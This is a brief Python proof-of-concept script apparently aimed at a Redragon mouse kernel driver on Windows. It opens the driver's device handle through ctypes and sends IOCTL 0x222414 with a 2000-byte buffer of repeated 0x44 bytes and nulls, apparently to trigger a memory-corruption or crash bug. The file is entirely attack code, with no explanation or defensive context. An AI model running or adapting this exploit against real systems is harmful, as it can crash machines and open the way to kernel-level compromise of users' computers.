import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "REDRAGON_MOUSE"

ioctl = 0x222414



kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\GLOBALROOT\\Device\REDRAGON_MOUSE", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry!")

else:
    print ("OPENED!")
                    
    buf = '\x44' * 1000 + '\x00' * 1000
    bufLength = 2000
    
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

